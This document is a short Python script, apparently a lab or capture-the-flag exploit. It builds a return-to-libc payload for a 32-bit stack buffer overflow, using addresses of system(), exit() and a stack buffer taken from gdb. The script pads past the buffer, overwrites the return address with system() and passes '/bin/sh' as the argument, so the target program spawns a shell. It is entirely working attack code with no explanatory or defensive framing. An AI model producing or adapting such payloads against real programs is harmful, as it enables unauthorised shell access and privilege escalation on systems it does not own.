from struct import pack
import sys

# Addresses from gdb
bufAddr = 0xffffd384  # Address containing "sh"
sysCallAddr = 0x080518f0  # Address of system()
exitCallAddr = 0x08049d30  # Address of exit() or a clean return

# Construct payload
payload = b"/bin/sh;"  # Command to execute
padding = b"A" * (10 - len(payload)+8)  # Fill buffer up to return address
payload += padding
payload += b"B" * 4
payload += pack("<I", sysCallAddr)  # Overwrite return address with system()
payload += pack("<I", exitCallAddr)  # Return address after system()
payload += pack("<I", bufAddr)  # Argument for system()

sys.stdout.buffer.write(payload)

